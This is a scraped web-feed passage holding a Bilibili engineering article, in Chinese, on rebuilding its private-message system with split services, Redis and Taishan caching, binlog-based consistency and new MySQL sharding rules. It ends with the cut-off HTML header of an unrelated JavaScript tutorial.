                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>先思考两个问题：</strong></p>
<ul>
<li>技术上数据量越大，降级概率越大，但消息业务场景上数据量大的是影响力更大的UP，业务不接受技术降级，如何破？</li>
<li>如果消息流量增加10倍，怎么保障服务不挂？</li>
</ul>
</blockquote>
<h2 data-id="heading-0"><strong>1.现状</strong></h2>
<h3 data-id="heading-1"><strong>业务解读</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8af7c05996442a9b2d5f6f10259b0a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=r1RDisddKdCS1QV47dvVVPZdJE4%3D" alt="截屏2025-11-20 17.59.10.png" loading="lazy"/></p>
<p>按业务全域现状，在服务端角度分成客服系统、系统通知、互动通知和私信4个业务线，每个业务线内按现状标识了服务分层。私信内分为用户单聊、bToC的批量私信、群聊和应援团小助手四类，这四类细分私信没有技术解耦，单聊和批量私信比较接近系统天花板。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e3c9520770844388cc84208a9aeb95d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=DDxHtrzNcCizRhE4lQjhildVf18%3D" alt="图片" loading="lazy"/></p>
<p>私信单聊发送到触达的pv转化和uv转化不足10%，有明显通过业务优化提升触达率的潜力。</p>
<h3 data-id="heading-2"><strong>技术解读</strong></h3>
<p><strong>私信域内的几个概念解释：</strong></p>
<ul>
<li>会话列表：按聊天人排序的列表。即B站首页右上角信封一跳后看到的历史聊天人列表，以及点击未关注人等折叠会话看到的同属一类的聊天人列表。传达对方账号、最新私信和未读数的信息。点击一个会话后看到的是对聊历史，也称会话历史。</li>
<li>会话详情：描述和一个聊天人会话状态的原子概念，包括接收人uid、发送人uid、未读数、会话状态、会话排序位置等。</li>
<li>会话历史：按时间线对发送内容排序的列表。一份单聊会话历史既属于自己，也属于另一个和自己的聊天的人。群聊的会话历史属于该群，不属于某个成员。会话历史是收件箱和消息内容合并后的结果。</li>
<li>收件箱：将一次发送的时序位置映射到发送内容唯一id的kv存储，可以让服务端按时间序读取一批发送内容唯一id。</li>
<li>私信内容：一个包括发送内容唯一id、原始输入内容、消息状态的原子概念。批量私信把同一个发送内容唯一id写入每个收信人的收件箱里。</li>
<li>timeline模型：时间轴的抽象模型，模型包括消息体、已读位点、最大位点、生产者、消费者等基本模块，可以用于基于时间轴的数据同步、存储和索引。私信涉及timeline模型的包括会话列表和会话历史。</li>
<li>读扩散：pull模式。群聊每条私信只往群收件箱写一次，让成百上千的群成员在自己的设备都看到，是典型的读扩散。</li>
<li>写扩散：push模式。单聊每条私信既更新接收人会话也更新发送人会话，是轻微的写扩散，无系统压力。群聊有另一个不一样的特点，就是当群成员发送消息后，需要通过长链接通知其他群成员的在线设备，以及发送人其他的在线设备，这是一个写扩散的技术模型，但是这个写扩散是通知后即时销毁的，并且具有过期时间，所以仅临时占用资源，并不对存储造成压力，且能有较好的并发量。</li>
</ul>
<p><strong>私信核心概念关系表达：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df0942b9f4744a99bc8ca21b1d66d374~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=2fvQNVEVRQc4wtcQvpm0IBbDqXE%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>2.问题</strong></h2>
<h3 data-id="heading-4"><strong>会话慢查询</strong></h3>
<p>当会话缓存过期时，Mysql是唯一回源，Mysql能承载的瞬时QPS受当时应用总连接数和sql平均响应速度的影响，连接数打满时会给前端返回空会话列表。虽然可以增加POD数量、增大akso proxy连接数、优化sql和索引来作为短线方案，来提升瞬时请求Mysql容量，但是这种短线方案无法加快单次响应速度，mysql响应越来越慢的的问题依然在。另外增加POD数量也会降低发版速度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c615377ec6204f9cae1cb8ec5b0e742f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=XdV7CLIY70hLC16AInowpNIjAK4%3D" alt="图片" loading="lazy"/></p>
<p>会话Mysql使用用户uid%1000/100分库，用户uid%100分表，table总量是1000。</p>
<p>单表会话量在1kw-3.2kw。单个大up的会话积累了10W条以上，会话量最大的用户有0.2亿条会话。单个Up的会话会落到一张表中，每张表都有比较严重的数据倾斜。如果考虑增加分库分表的方案，sql查找条件依然需要用户uid，所以相当于倾斜数据要转移到新的单表，问题没有解决。另外，重新分库分表过程中新旧table增量同步和迁移业务读写流量的复杂度也很大，有比较大的业务风险。</p>
<p>Mysql的规格是48C 128G和32C 64G。由于会话数据量大，Mysql buffer_pool有限，数据比较容易从内存淘汰，然后mysql需要进行磁盘扫描并将需要的数据加载到内存进行运算，加之比较多的磁盘扫描数据，这时的响应一般在秒级别，接口会给前端返回超时错误，会话列表页空白。</p>
<p>为了适配业务发展，Mysql 会话表 已经添加了9个非聚集索引，如果通过增加索引使用业务需要，需要更大的Mysql资源，且解决不了冷数据慢查询的问题。增加更多索引也会让Mysql写入更慢。</p>
<h3 data-id="heading-5"><strong>私信内容单表空间和写性能接近天花板</strong></h3>
<p>每条私信内容都绑定私信自己的发号器生成的msgkey，即私信内容唯一id，该msgkey包含私信发送时的时间戳。读写私信内容Mysql之前先从msgkey解析出时间，用这个时间路由分库分表。私信内容库按季度分库，分库内按月度分表，单表数据量数亿，数据量最大的用户日增私信351.9W条。按照曲率预测，25年全年数据量有近百亿，如果继续按照月度分表，分表规则不适应增长。</p>
<p>当前该Mysql最大写qps 790，特别活动时写qps峰值预计是20k，但是为了保障Mysql服务整体的可靠，单库写流量我们需要控制在3000qps以下，无法满足写入量峰值时的需要。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5501c86282244e108896f454267a8c71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=chj1Q%2FbTP%2FP9GWIPW%2BOaUzY3BX4%3D" alt="图片" loading="lazy"/></p>
<p>此外，消息内容表结构包含了群聊、单聊和应援团小助手全部的属性，增加业务使用难度。绝大部分私信内容是单聊的。</p>
<h3 data-id="heading-6"><strong>服务端代码耦合</strong></h3>
<p>四类私信（单聊、群聊、B端批量私信、应援团小助手）都需要实现发送和触达两条核心链路，四种私信核心链路的代码逻辑和存储耦合在一起，代码复杂度随着业务功能上线而不断增加，熵增需要得到控制。从微服务这方面来说，实例和存储耦合会带来资源随机竞争，当一方流量上涨，可能给对方的业务性能带来不必要的影响，也会带来不必要的变更传导。</p>
<h2 data-id="heading-7"><strong>3.升级路径</strong></h2>
<p>基于对私信现状的论述，可以确定我们要优化的是一个数据密集型 &gt;&gt; 计算密集型，读多写少（首页未读数）、读少写多（会话）场景兼具的系统，同时需要拥有热门C端产品的稳定性、扩展性和好的业务域解耦。针对读多写少和读少写多制定了针对的技术方案。</p>
<h3 data-id="heading-8"><strong>消息域整体架构设计</strong></h3>
<p>结合B站业务现状，我觉得比较合理的架构：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bc128ae1c27403ca541f688bb787213~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=0%2BGVjwiH%2BpzbWazHTHGDm%2BWJNhU%3D" alt="图片" loading="lazy"/></p>
<p><strong>一个兼顾复杂列表查询架构和IM架构的消息域框架，整体分四层</strong></p>
<p><strong>接入层：即toC的BFF和服务端网关</strong></p>
<p><strong>业务层：按复杂查询设计系统，用于各种业务形态的支撑</strong></p>
<p><strong>平台层：按IM架构设计系统，目标是实时、有序的触达用户，平台层可扩展</strong></p>
<p><strong>触达层：对接长链和push</strong></p>
<h3 data-id="heading-9"><strong>端上本地缓存降级</strong></h3>
<p>端上应该支持部分数据缓存，以确保极端情况下用户端可展示，可以是仅核心场景，比如支付小助手、官号通知，用户在任何情况下打开消息页都不应该白屏。</p>
<h3 data-id="heading-10"><strong>BFF架构升级</strong></h3>
<p>BFF网关吸收上浮的业务逻辑，控制需求向核心领域传导。服务端基于业务领域的能力边界，抽象出单聊、群聊、系统通知、互动通知和消息设置共五个新服务，提升微服务健康度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d938fa4ff32747a18a04d57e117dd8d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=qAtYUXZ9Dlh9rs0te7TDCi23wdQ%3D" alt="图片" loading="lazy"/></p>
<p>新服务剥离了历史包袱，也解决一些在老服务难解的功能case，优化了用户体验，比如消息页不同类型消息的功能一致性；重新设计会话缓存结构和更新机制，优化Mysql索引，优化Mysql查询语句，减少了一个量级的慢查询。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b670aaaad09345bcb268ed0295e4d529~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=torrTE2vspFIIOapvrKqeIQ%2FnMo%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-11"><strong>服务端可用性升级</strong></h3>
<p>服务端按四层拆分后，集中精力优化业务层和平台层：</p>
<p><strong>业务层：按复杂查询设计系统，用于各种业务形态的支撑</strong></p>
<p>冷热分离：多级缓存 redis(核心数据有过期)+taishan(有限明细数据)+mysql(全部数据)</p>
<p>读写分离：95%以上复杂查询可以迁移到从库读</p>
<p><strong>平台层：按IM架构设计系统，目标是实时、有序的触达用户，平台层可扩展</strong></p>
<p>Timeline模型：依赖雪花发号器，成熟方案</p>
<p>读写扩散：单聊-写扩散，群聊-读扩散</p>
<h4 data-id="heading-12"><strong>单聊会话</strong></h4>
<ul>
<li><strong>缓存主动预热</strong></li>
</ul>
<p>用户在首页获取未读数是一个业务域内可以捕捉的事件，通过异步消费这个事件通知服务端创建会话缓存，提高用户查看会话的缓存命中率。鉴于大部分人打开B站并不会进私信，此处可以仅大UP预热。大UP的uid集合可以在数平离线分析会话数据后写入泰山表，这个泰山表更新时效是T+1。</p>
<p>监控UP会话数量实时热点，触发突增阈值时，通过异步链路自动为热点用户主动预热会话列表缓存。</p>
<p>对预热成功率添加监控，并在数平离线任务失败或者预热失败时做出业务告警，及时排查原因，避免功能失效。</p>
<p>泰山和Mysql双持久化</p>
<p>增加泰山存储用户有限会话明细，作为redis未命中后的第一回源选择，Mysql作为泰山之后的次选。基于用户翻页长度分析后确定泰山存储的有限会话的量级。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb537260557145fbbab2d72c3bacf9c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=fjv91MRvsQQstToH%2FPoxM6DIg90%3D" alt="图片" loading="lazy"/></p>
<p>redis 存储24小时数据，taishan 存储 600条/用户（20页），预设到的极端情况才会回源mysql从库。</p>
<p>对于ZSET和KV两种数据结构，评估了各自读写性能的可靠性，符合业务预期。业务如果新增会话类型，可以跟本次新增泰山有限明细一样，基于会话类型的具体规则新增泰山Key。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f0ba03e9bc64d769dc815a9d6301834~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=6YXahbxvAdZLylbop7RLbtNMPuc%3D" alt="图片" loading="lazy"/></p>
<ul>
<li><strong>泰山长尾优化</strong></li>
</ul>
<p>查询redis未命中时会优先回源泰山，考虑到泰山99分位线在50ms以下，而且Mysql多从实例都能承受来自C端的读请求，所以采用比泰山报错后降级Mysql稍微激进的对冲回源策略。在泰山出现“长尾”请求时，取得比较好的耗时优化效果。可以使用大仓提供的error group结合quit channel实现该回源策略，同时能避免协程泄漏。整个处理过程在业务响应和资源开销中维持中间的平衡，等待泰山的时间可以灵活调整。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/934b38f45b91423d8e98574838e2580e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=thBORkiT8sq2SiXmfHqbLubL1Ag%3D" alt="图片" loading="lazy"/></p>
<p>泰山最初没有数据，可以在泰山未命中时进行被动加载，保证用户回访时能命中。</p>
<ul>
<li><strong>一致性保证</strong></li>
</ul>
<p>虽然我们重构了新服务，但是老服务也需要保留，用来处理未接入BFF的移动端老版本和web端请求，这些前端在更新会话时（比如ACK）请求到了老服务，新服务需要通过订阅会话Mysql binlog异步更新本服务的redis和泰山。为了避免分区倾斜，订阅binlog的dts任务使用id分区，这样方便的是一条会话在topic的分区是固定的。</p>
<p>为了避免两次请求分别命中泰山和Mysql时给用户返回的数据不一样，需要解决三大问题：</p>
<ul>
<li>当出现分区rebalance需要避免重复消费；</li>
<li>当Mysql一条会话记录在短时间内（秒级）多次更新，要保证binlog处理器不会逆时间序消费同一个会话的binlog，即跳过较早版本的binlog；</li>
<li>保证泰山写入正确并且从Mysql低延迟同步。</li>
</ul>
<p>这三个问题都要保证最终一致性，具体解决方案是用redis lua脚本实现compare and swap，lua脚本具有原生的原子性优势。dts每同步一条binlog都会携带毫秒级mtime，当binlog被采用时，mtime被记入redis10分钟，如果下一条binlog的mtime大于redis记录的mtime，这条binlog被采用，否则被丢弃。这个过程可以考虑使用gtid代替mtime，但这个存在的问题是每个从实例单独维护自己的gtid，当特殊情况发生mysql主从切换，或者dts订阅的从节点发生变更，gtid在CAS计算中变得不再可靠，所以我们选择了使用mtime作为Mysql会话记录的版本。</p>
<p>通过消费路线高性能设计保证泰山异步更新的延迟在1秒以内，并在特殊情况延迟突破1s时有效告警。高性能消费路线中，每个库的binlog分片到50个partition，业务提供不低于50个消费pod，单pod配置100并发数，按照写泰山999分位线20ms计算，每秒可以消费50<em>100</em>(1000/20)=250000条，大约线上峰值8.3倍，考虑dts本身的max延迟在600~700毫秒，同步泰山和redis的延迟会在700毫秒至1秒以内，符合业务预期。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4c6ccf37bd747548004ca52b1f6bbba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=Z2xVicUpkNSQwTL0W3V2zOSUwSE%3D" alt="图片" loading="lazy"/></p>
<h4 data-id="heading-13"><strong>收件箱</strong></h4>
<p>BFF已经从业务层和平台层将单聊读收件箱独立出来，本次升级主要是从存储做增量解耦 ，存量单聊收件箱的读流量可以访问旧表。 单聊新收件箱存储采用redis+泰山的模式，redis提供热数据，泰山提供全部数据并采用RANDOM读模式，让主副本都能分担读流量。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/362950787f4544ea951dc7aef29ee49c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=KIB4HGTA%2FPu%2FB9OhwW9DeSjZ24M%3D" alt="图片" loading="lazy"/></p>
<h4 data-id="heading-14"><strong>私信内容</strong></h4>
<p>本次升级主要如下</p>
<ul>
<li>单聊增量数据独立存储，按照单聊业务设计表结构，和群聊、应援团小助手彻底解耦。</li>
<li>写Mysql升级为异步化操作，提高写性能天花板，这种异步写Mysql改造不会影响读消息内容的可用性和设计。</li>
<li>单聊分库规则升级为月度分库，单库内分表为100张。 群聊、应援团小助手和历史单聊依然使用旧的分库分表规则读写Mysql。</li>
</ul>
<p>业务需要对增量单聊私信路由分库分表时，先从msgkey先解析出时间戳，找到用时间戳对应的月份分库，然后用msgkey对100取余找到分表。这种方案能达到按时间纬度的冷热数据的分离，同时由于msgkey取余的结果具有随机性，平衡了每张表的读写流量。这样预计2025年单表数据量能从9亿下降到900万。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40a907e4be1b413abf507e8a7d86ccc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=1QUxfNtyQM86%2FRcEEQbYhQrNtAk%3D" alt="图片" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec0e4c38590d401e8ec619b013833f51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOU5ZOp5ZOU5ZOp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764302122&amp;x-signature=muHuMJJ1C9V854vkcCJPOe85img%3D" alt="图片" loading="lazy"/></p>
<h4 data-id="heading-15"><strong>批量私信</strong></h4>
<ul>
<li>
<p>日常通道：日常批量私信任务共用通道，共用配额。</p>
</li>
<li>
<p>高优通道：主要通过将链路上topic partition扩容、消费POD扩容、POD内消费通道数扩容、缓存扩容、akso proxy连接数扩容，把平均发送速度从3500 人/秒提高到30000人/秒。这个通道可以特殊时期开给特殊业务使用。</p>
</li>
</ul>
<h2 data-id="heading-16"><strong>4.结语</strong></h2>
<p>我们逐步发现技术升级不是一蹴而就的，一个逐步优化的过程；设计技术方案前设立合适和有一些挑战的目标，但这个目标要控制成本，做好可行性；设计技术方案的时候，需要清楚现有架构与理想架构的差距和具体差异点，做多个方案选型，并确定一个，这个更多从技术团队考虑；其次要保证功能在新老架构平稳过渡，保证业务的稳定性。后面持续关注新老架构的技术数据，持续优化，老架构要持续关注它的收敛替换。IM系统是一个老生常谈的话题，也是融合众多有趣技术难点的地方，欢迎感兴趣的同行交流研讨。</p>
<p>-End-</p>
<p>作者丨比奇堡、Xd、三木森</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别再把对象当“字典”！JS 零基础也能看懂的“属性账本”拆解笔记]]></title>    <link>https://juejin.cn/post/7574726841542623270</link>    <guid>https://juejin.cn/post/7574726841542623270</guid>    <pubDate>2025-11-21T02:37:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574726841542623270" data-draft-id="7574658078269980723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别再把对象当“字典”！JS 零基础也能看懂的“属性账本”拆解笔记"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-21T02:37:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="漫天黄叶远飞"/> <meta itemprop="url" content="https://juejin.cn/user/2948205649344634"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别再把对象当“字典”！JS 零基础也能看懂的“属性账本”拆解笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2948205649344634/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    漫天黄叶远飞
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:37:13.000Z" title="Fri Nov 21 2025 02:37:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 